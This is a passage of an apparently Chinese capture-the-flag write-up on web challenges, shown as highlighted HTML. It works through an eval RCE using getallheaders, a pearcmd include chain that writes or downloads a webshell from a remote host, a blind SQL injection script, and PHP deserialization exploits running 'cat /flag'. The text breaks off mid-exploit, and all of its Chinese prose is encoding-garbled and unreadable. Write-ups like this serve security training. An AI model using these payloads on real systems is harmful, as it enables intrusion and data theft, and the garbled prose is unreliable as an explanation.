data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>if (&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;star&#39;]))</code>Êó†ÂèÇÊï∞rce</p><blockquote><p>GETÔºö<br>star&#x3D;eval(next(getallheaders()));<br><img src="https://img-blog.csdnimg.cn/bffdd37418c0412c80b75fb545225002.png" alt="123"></p></blockquote><h2 id="week3-web"><a href="#week3-web" class="headerlink" title="week3-web"></a>week3-web</h2><h3 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h3><p>Áü•ËØÜÁÇπÔºö‰∏ãËΩΩÊú®È©¨Êñá‰ª∂Âà∞Èù∂Êú∫„ÄÅregister_argc_argv</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|log|session|filter|input|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment"># Something in phpinfo.php!</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÖàÂåÖÂê´phpinfo.phpÊñá‰ª∂ÁúãÁúã<br>ÊêúÁ¥¢flagÂèëÁé∞ÊèêÁ§∫<code>register_argc_argv</code><br><img src="https://img-blog.csdnimg.cn/b99c8a88c07a4e6286d25ca285e74158.png" alt="456"><br>ÊâæÊâæÊúâÊ≤°ÊúâÁõ∏ÂÖ≥ÊºèÊ¥ûÔºåÊÅ∞Â•ΩÊâæÂà∞‰∫Ü‰∏ÄÁØáÊñáÁ´†Ôºö<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">registerargcargv‰∏éinclude to RCEÁöÑÂ∑ßÂ¶ôÁªÑÂêà</a></p><blockquote><p>&#x2F;&#x2F;ÈÄöËøáÊú¨Âú∞Áõ¥Êé•ÂÜôÂÖ•webshell,Ê≥®ÊÑèËøôÈáåÊúÄÂ•ΩÊäìÂåÖÁÑ∂ÂêéÁî®burpsuiteÊàñËÄÖÁõ¥Êé•curlÊâßË°åÔºåÂê¶ÂàôÊµèËßàÂô®‰ºöÂ∞Ü&lt; ? &gt; ËΩ¨‰πâ<br>&#x2F;&#x2F; config-createÂèØ‰ª•Áõ¥Êé•ÂàõÂª∫ÈÖçÁΩÆÊñá‰ª∂Ôºå‰∏îÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂøÖÈ°ª‰ª•&#x2F;ÂºÄÂ§¥<br><a href="http://ip:port/include.php?f=pearcmd&amp;+config-create+/">http://ip:port/include.php?f=pearcmd&amp;+config-create+/</a><?=phpinfo();?>+&#x2F;tmp&#x2F;evil.php<br>&#x2F;&#x2F; ÈÄöËøáËøúÁ®ãÁõ¥Êé•‰∏ãËΩΩwebshell<br>&#x2F;&#x2F; webÁõÆÂΩïÂèØÂÜô</p><ul><li><a href="http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php">http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</a></li><li><a href="http://ip:port/tmp/pear/download/evil.php">http://ip:port/tmp/pear/download/evil.php</a><br>&#x2F;&#x2F; tmpÁõÆÂΩïÂèØÂÜô</li><li><a href="http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php">http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</a></li><li><a href="http://ip:port/include.php?f=/tmp/pear/download/evil">http://ip:port/include.php?f=/tmp/pear/download/evil</a></li></ul></blockquote><p><img src="https://img-blog.csdnimg.cn/7d3cce3881de4f9a89bc8e659bf3f395.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/66e920198f60410f8ba08d44e18bb64f.png" alt="789"><br>ÁÑ∂ÂêéËÆøÈóÆ<code>/tmp/pear/download/1.php</code>ÂèëÁé∞ÊàêÂäü‰º†ÂÖ•<br><img src="https://img-blog.csdnimg.cn/1daa56ab972347a98aa42ad9931a2d1a.png" alt="456"></p><h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>Áü•ËØÜÁÇπÔºösqlÁõ≤Ê≥®<br><img src="https://img-blog.csdnimg.cn/a6ea86a9c7d14d3d853ce0e18ea3c65f.png" alt="1"><br>Â∞ùËØïÊ≥®ÂÖ•Ôºö<br>ÂçïÂºïÂè∑‰∏çÂõûÊòæ<br><code>1TMP3074&#39;Or 1=1 -- -</code><br>ÊàêÂäüÂõûÊòæ<br>burpÊµãËØïËøáÊª§ÁöÑÂáΩÊï∞ÊàñÂ≠óÁ¨¶ÔºåÂèëÁé∞Â¶Ç‰∏ãÁöÑË¢´ËøáÊª§‰∫Ü<br><img src="https://img-blog.csdnimg.cn/8bc362b3464d4e77a078e91c27a32ddf.png" alt="1"><br>‰ΩøÁî®order byÂèëÁé∞Â≠òÂú®5‰∏™Ë°®Ôºå‰ΩÜÊòØÂêéÈù¢ÂÜç‰ΩøÁî®unionÊòØÂèëÁé∞Ê≤°ÊúâunionÔºåÊç¢‰∏ÄÁßçÊñπÊ≥ï<br>‰ΩøÁî®Áõ≤Ê≥®Âà§Êñ≠ÂΩìÂâçÊï∞ÊçÆÂ∫ìÂêçÁöÑÂ≠óÁ¨¶Êï∞<br><code>?id=1TMP3074&#39; Or length(database()) &gt; 2--+</code>ÂõûÊòæ<br><code>?id=1TMP3074&#39; Or length(database()) &gt; 3--+</code>‰∏çÂõûÊòæÔºåËØ¥ÊòéÂΩìÂâçÊï∞ÊçÆÂ∫ìÂêçÁöÑÂ≠óÁ¨¶Êï∞‰∏∫‰∏â„ÄÇ<br>ÁÑ∂ÂêéÂà§Êñ≠Êï∞ÊçÆÂ∫ìÂêçÂà∞Â∫ïÊòØ‰ªÄ‰πà<br><code>?id=1TMP3074&#39;Or mid(database(),1,1)= &#39;b&#39; --</code>ËøôÊ†∑Â§™ÊÖ¢‰∫ÜÔºå‰ΩøÁî®ËÑöÊú¨<br>ÊúÄÂêéÁöÑexpÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://13d36774-d283-422c-98f2-9164d199a034.node4.buuoj.cn:81/?id=TMP0919'AND "</span>result <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Ascii(Substr((Select flag from here_is_flag),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">--+'</span></span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"points"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># ÊöÇÂÅú1ÁßíÔºåÈôç‰ΩéÁà¨ÂèñÈÄüÂ∫¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/18afb59598064b03b3ab0b7644b4a319.png" alt="1"></p><h2 id="week4-web"><a href="#week4-web" class="headerlink" title="week4-web"></a>week4-web</h2><h3 id="ÈÄÉ"><a href="#ÈÄÉ" class="headerlink" title="ÈÄÉ"></a>ÈÄÉ</h3><p>Áü•ËØÜÁÇπÔºöÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂΩìÁªôkeyÈöè‰æøËµã‰∏Ä‰∏™ÂÄºÊó∂</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'456789789'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ËøêË°åÁªìÊûúÔºöO:7:"GetFlag":2:&#123;s:3:"key";s:9:"456789789";s:3:"cmd";s:6:"whoami";&#125;n0rt6\86159</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Â¶ÇÊûúÂêéÈù¢ÁöÑ<code>whoami</code>ËÉΩÂ§üËÆ©Êàë‰ª¨ÊéßÂà∂Êù•ËøõË°åÂëΩ‰ª§ÊâßË°åÔºåÈÇ£ÁõÆÁöÑÂ∞±ËææÂà∞‰∫Ü„ÄÇ<br><code>&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>ÊÄªÂÖ±26‰∏™Â≠óÁ¨¶Ôºå<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>ÊÄªÂÖ±29‰∏™Â≠óÁ¨¶„ÄÇ<br>wafÂáΩÊï∞ÂäüËÉΩÂèØ‰ª•Â∞ÜbadÊç¢‰∏∫goodÔºå‰πüÂ∞±Â¢ûÂä†‰∫Ü‰∏Ä‰∏™Â≠óÁ¨¶„ÄÇ<br>ÈÇ£‰πà‰ΩøÁî®29‰∏™Â≠óÁ¨¶Â∞±ÊòØÁî®29‰∏™badÔºåÊ≠£Â•ΩÊää<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>È°∂Âá∫Âéª‰∫ÜÔºå‰ªéËÄåËææÂà∞ÊâßË°åÂëΩ‰ª§ÁöÑÊïàÊûú<br>expÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/38746d4f57ca42c7934536d2694d8579.png" alt="123"></p><h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><p>Áü•ËØÜÁÇπÔºöÂèçÂ∫èÂàóÂåñ„ÄÅGCÂõûÊî∂</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$errMsg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">errMsg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pwn</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Reverse</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Web</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not Flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$wel</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token property">good</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"NewStar"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"good job but nothing"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fast'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nope"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊâæÂÖ•Âè£Ôºö<code>__destruct()</code><br>ÊâæÂá∫Âè£Ôºö<code>evil()</code><br>ÈìæÂ≠êÔºö</p><blockquote><p><code>Start-&gt;Crypto-&gt;Reverse-&gt;Pwn-&gt;Web</code></p></blockquote><p>Ë¶ÅÁªïËøá<code>throw new Exception(&quot;Nope&quot;);</code>ÔºåËøôÈáåthrowÂ∞±ÊòØGCÂõûÊî∂„ÄÇ<br>Âú®php‰∏≠ÔºåÂΩìÂØπË±°Ë¢´ÈîÄÊØÅÊó∂‰ºöËá™Âä®Ë∞ÉÁî®__destruct()ÊñπÊ≥ïÔºå‰ΩÜÂ¶ÇÊûúÁ®ãÂ∫èÊä•ÈîôÊàñËÄÖÊäõÂá∫ÂºÇÂ∏∏ÔºåÂ∞±‰∏ç‰ºöËß¶ÂèëËØ•È≠îÊúØÊñπÊ≥ï„ÄÇ<br>ÂΩì‰∏Ä‰∏™Á±ªÂàõÂª∫‰πãÂêéÂÆÉ‰ºöËá™Â∑±Ê∂àÂ§±ÔºåËÄå __destruct() È≠îÊúØÊñπÊ≥ïÁöÑËß¶ÂèëÊù°‰ª∂Â∞±ÊòØ‰∏Ä‰∏™Á±ªË¢´ÈîÄÊØÅÊó∂Ëß¶ÂèëÔºåËÄåthrowÈÇ£‰∏™ÂáΩÊï∞Â∞±ÊòØÂõûÊî∂‰∫ÜËá™Âä®ÈîÄÊØÅÁöÑÁ±ªÔºåÂØºËá¥destructÊ£ÄÊµã‰∏çÂà∞Êúâ‰∏úË•øÈîÄÊØÅÔºå‰ªéËÄå‰πüÂ∞±ÂØºËá¥Êó†Ê≥ïËß¶ÂèëdestructÂáΩÊï∞„ÄÇ<br>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$errMsg</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pwn</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span><span class="token 